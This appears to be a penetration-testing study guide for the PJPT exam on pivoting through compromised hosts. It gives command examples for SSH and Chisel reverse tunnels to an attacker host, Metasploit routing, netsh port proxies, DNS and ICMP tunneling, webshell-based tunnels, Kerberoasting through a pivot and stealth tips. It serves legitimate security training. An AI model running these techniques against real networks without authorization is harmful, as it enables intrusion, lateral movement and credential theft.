# Pivoting Techniques

## Overview
Pivoting is the technique of using a compromised system to attack other systems on the same network that are not directly accessible from the attacker's machine. This guide covers essential pivoting techniques for PJPT certification.

## What is Pivoting?

### Definition
**Pivoting** is the practice of using a compromised system as a stepping stone to reach and attack other systems in internal networks that are not directly accessible from the internet.

### When to Use Pivoting
- **Target is in internal network** (10.x.x.x, 192.168.x.x, 172.16-31.x.x)
- **Dual-homed systems** (system with multiple network interfaces)
- **DMZ compromise** - accessing internal corporate network
- **Lateral movement** within enterprise networks

## Network Discovery for Pivoting

### 1. Identify Network Interfaces
```bash
# On compromised Linux system
ip a
ifconfig -a
route -n
netstat -rn

# On compromised Windows system
ipconfig /all
route print
arp -a
netstat -rn
```

### 2. Network Scanning from Pivot
```bash
# Ping sweep from compromised system
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" & done

# Port scanning with netcat
nc -zv 192.168.1.10 80
nc -zv 192.168.1.10 22 443 3389

# Using nmap (if available on target)
nmap -sn 192.168.1.0/24
nmap -p 22,80,443,3389 192.168.1.0/24
```

## ProxyChains Configuration

### 1. Basic ProxyChains Setup
```bash
# Edit proxychains configuration
sudo nano /etc/proxychains4.conf

# Basic configuration example:
[ProxyList]
# Examples:
# socks5  192.168.67.78   1080    lamer   secret
# http    192.168.89.3    8080    justu   hidden
# socks4  192.168.1.49    1080
# http    192.168.39.93   8080

# Default Tor proxy
socks4  127.0.0.1 9050
```

### 2. ProxyChains Configuration Types
```bash
# Dynamic chain (default) - goes through proxy list in order
dynamic_chain

# Strict chain - all proxies must be online
strict_chain  

# Random chain - random proxy from list
random_chain

# Proxy types supported:
# http, socks4, socks5
# Auth types supported: "basic"-http "user/pass"-socks
```

### 3. Common ProxyChains Usage
```bash
# Basic syntax
proxychains <command>

# Examples
proxychains nmap -sT -Pn target_ip
proxychains curl http://internal-server.local
proxychains firefox
proxychains msfconsole
```

## SSH Tunneling

### 1. Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Create SOCKS proxy through SSH
ssh -f -N -D 9050 -i pivot_key root@pivot_server

# Parameters explained:
# -f: Fork to background
# -N: Don't execute remote command
# -D: Dynamic port forwarding (SOCKS proxy)
# -i: Identity file (private key)
# 9050: Local SOCKS proxy port

# Update proxychains config
echo "socks4 127.0.0.1 9050" >> /etc/proxychains4.conf

# Use the tunnel
proxychains nmap -p 88 internal_target
```

### 2. Local Port Forwarding
```bash
# Forward local port to remote service
ssh -L local_port:target_host:target_port user@pivot_server

# Example: Access internal RDP through pivot
ssh -L 3389:192.168.1.10:3389 root@pivot_server
rdesktop localhost:3389

# Example: Access internal web server
ssh -L 8080:192.168.1.100:80 user@pivot
# Then browse to http://localhost:8080
```

### 3. Remote Port Forwarding
```bash
# Forward remote port back to attacker machine
ssh -R remote_port:localhost:local_port user@pivot_server

# Example: Get reverse shell through pivot
ssh -R 4444:localhost:4444 user@pivot
# Then execute reverse shell on internal targets connecting to pivot:4444
```

### 4. SSH Tunnel with Key-based Authentication
```bash
# Generate SSH key pair
ssh-keygen -t rsa -b 2048 -f pivot_key

# Copy public key to pivot server
ssh-copy-id -i pivot_key.pub user@pivot_server

# Create tunnel with key
ssh -f -N -D 9050 -i pivot_key user@pivot_server

# Verify tunnel
netstat -tlnp | grep 9050
```

## Chisel Tunneling

### 1. Chisel Server Setup (Attacker Machine)
```bash
# Download chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64
mv chisel_1.8.1_linux_amd64 chisel

# Start chisel server
./chisel server --reverse --port 8000

# Server with authentication
./chisel server --reverse --port 8000 --auth user:pass
```

### 2. Chisel Client (Pivot Machine)
```bash
# Basic SOCKS proxy
./chisel client attacker_ip:8000 R:9050:socks

# With authentication
./chisel client --auth user:pass attacker_ip:8000 R:9050:socks

# Port forwarding
./chisel client attacker_ip:8000 R:3389:192.168.1.10:3389

# Multiple forwards
./chisel client attacker_ip:8000 R:9050:socks R:3389:192.168.1.10:3389
```

### 3. Using Chisel Tunnel
```bash
# Update proxychains for chisel SOCKS
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf

# Use through proxychains
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.10 -request
```

## Sshuttle - VPN over SSH

### 1. Basic Sshuttle Usage
```bash
# Install sshuttle
sudo apt install sshuttle

# Tunnel entire subnet
sshuttle -r root@pivot_server 192.168.1.0/24

# Multiple subnets
sshuttle -r user@pivot_server 192.168.1.0/24 10.10.10.0/24

# With DNS forwarding
sshuttle -r user@pivot --dns 192.168.1.0/24
```

### 2. Advanced Sshuttle Options
```bash
# Auto-detect subnets
sshuttle -r user@pivot --auto-nets

# SSH key authentication
sshuttle -r user@pivot --ssh-cmd "ssh -i /path/to/key" 192.168.1.0/24

# Specific ports only
sshuttle -r user@pivot --to-ns=8.8.8.8 192.168.1.0/24

# Exclude certain IPs
sshuttle -r user@pivot -x 192.168.1.1 192.168.1.0/24
```

## Metasploit Pivoting

### 1. Autoroute Module
```bash
# In meterpreter session
meterpreter > run autoroute -s 192.168.1.0/24

# Or use post module
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 192.168.1.0/24
run

# List routes
route print
```

### 2. SOCKS Proxy with Metasploit
```bash
# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run -j

# Configure proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains4.conf

# Use proxy
proxychains nmap -sT -Pn 192.168.1.10
```

### 3. Port Forward with Metasploit
```bash
# In meterpreter session
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.10
meterpreter > portfwd list

# Connect to forwarded port
rdesktop localhost:3389
```

## Double Pivoting

### 1. Chain Multiple Pivots
```bash
# First pivot: Attacker -> DMZ Server
ssh -f -N -D 9050 -i key1 user@dmz_server

# Second pivot: DMZ -> Internal Network
# On DMZ server, create second tunnel
ssh -f -N -D 9051 -i key2 user@internal_server

# Configure proxychains for double pivot
[ProxyList]
socks4 127.0.0.1 9050
socks4 127.0.0.1 9051
```

### 2. SSH Jump Hosts
```bash
# Direct jump through multiple hosts
ssh -J user1@pivot1,user2@pivot2 user3@final_target

# ProxyCommand method
ssh -o ProxyCommand="ssh -W %h:%p user@pivot_server" user@internal_server
```

## Practical Pivoting Scenarios

### Scenario 1: Web Server to Domain Controller
```bash
# 1. Compromise web server (192.168.1.100)
# 2. Discover domain controller (192.168.1.10)

# Create SSH tunnel
ssh -f -N -D 9050 www-data@192.168.1.100

# Configure proxychains
echo "socks4 127.0.0.1 9050" >> /etc/proxychains4.conf

# Scan domain controller through pivot
proxychains nmap -p 88,135,139,389,445 192.168.1.10

# Kerberoasting through pivot
proxychains GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.10 -request

# RDP access through pivot
proxychains xfreerdp /u:administrator /p:'Password123!' /v:192.168.1.10
```

### Scenario 2: DMZ to Internal Network
```bash
# 1. Compromise DMZ server (10.10.10.5 and 192.168.1.5)
# 2. Access internal network (192.168.1.0/24)

# Method 1: SSH Dynamic Forwarding
ssh -f -N -D 9050 -i pivot root@10.10.10.5

# Method 2: Sshuttle (cleaner for full network access)
sshuttle -r root@10.10.10.5 192.168.1.0/24

# Method 3: Chisel
# On attacker:
./chisel server --reverse --port 8000
# On pivot:
./chisel client attacker_ip:8000 R:9050:socks
```

### Scenario 3: Windows Pivot with Netsh
```cmd
# On compromised Windows machine
# Port forwarding using netsh
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=192.168.1.10

# Check port proxy rules  
netsh interface portproxy show all

# Delete rule when done
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
```

## Advanced Pivoting Techniques

### 1. ICMP Tunneling
```bash
# Using ptunnel (if ICMP allowed through firewall)
# On pivot server:
sudo ptunnel -x password

# On attacker:
sudo ptunnel -p pivot_server -lp 8080 -da internal_target -dp 80 -x password
```

### 2. DNS Tunneling
```bash
# Using iodine (if DNS queries allowed)
# On attacker (DNS server):
sudo iodined -f -c -P password 10.0.0.1 tunnel.example.com

# On pivot:
sudo iodine -f -P password tunnel.example.com
```

### 3. HTTP Tunneling
```bash
# Using reGeorg
# Upload reGeorg webshell to web server
# Create tunnel:
python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.php

# Configure proxychains
echo "socks5 127.0.0.1 8080" >> /etc/proxychains4.conf
```

## Traffic Analysis and OpSec

### 1. Monitoring Tunnel Traffic
```bash
# Monitor SOCKS proxy connections
netstat -tlnp | grep 9050
ss -tlnp | grep 9050

# Check active SSH tunnels
ps aux | grep ssh
lsof -i :9050
```

### 2. Stealth Considerations
```bash
# Use non-standard ports
ssh -f -N -D 8443 -p 2222 user@pivot

# Compress traffic
ssh -f -N -D 9050 -C user@pivot

# Keep connection alive
ssh -f -N -D 9050 -o ServerAliveInterval=60 user@pivot

# Bind to localhost only (more stealthy)
ssh -f -N -D 127.0.0.1:9050 user@pivot
```

## Troubleshooting Pivoting

### Common Issues and Solutions
```bash
# Issue: "channel 2: open failed: administratively prohibited"
# Solution: Check SSH config for AllowTcpForwarding

# Issue: SOCKS proxy not working
# Solution: Check proxychains config and verify tunnel
netstat -tlnp | grep 9050
proxychains curl http://httpbin.org/ip

# Issue: DNS resolution through tunnel
# Solution: Use proxy_dns in proxychains config
proxy_dns

# Issue: Slow tunnel performance
# Solution: Enable compression and tune settings
ssh -f -N -D 9050 -C -o Compression=yes user@pivot
```

## PJPT Exam Tips

### Essential Commands to Memorize
```bash
# SSH SOCKS proxy
ssh -f -N -D 9050 -i key user@pivot

# Proxychains usage
proxychains nmap -sT -Pn target
proxychains GetUserSPNs.py domain/user:pass -dc-ip target -request

# Chisel server/client
./chisel server --reverse --port 8000
./chisel client attacker_ip:8000 R:9050:socks

# Sshuttle VPN
sshuttle -r user@pivot 192.168.1.0/24
```

### ProxyChains Configuration Template
```bash
# /etc/proxychains4.conf
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4 127.0.0.1 9050
```

### Documentation Requirements
1. **Network diagram** showing pivot path
2. **Commands used** for tunnel setup  
3. **Proof of access** to internal resources
4. **Cleanup procedures** for tunnels
5. **Alternative pivot methods** tested

### Common Exam Scenarios
- **DMZ server** with dual network interfaces
- **Web server** in internal network
- **Jump box** scenarios requiring double pivoting
- **Windows environments** requiring netsh or other tools
- **Restricted environments** requiring DNS/ICMP tunneling

---

**Note**: Always ensure proper authorization before implementing pivoting techniques. These methods should only be used in authorized penetration testing scenarios. Properly clean up tunnels and connections after testing to avoid impacting client networks. 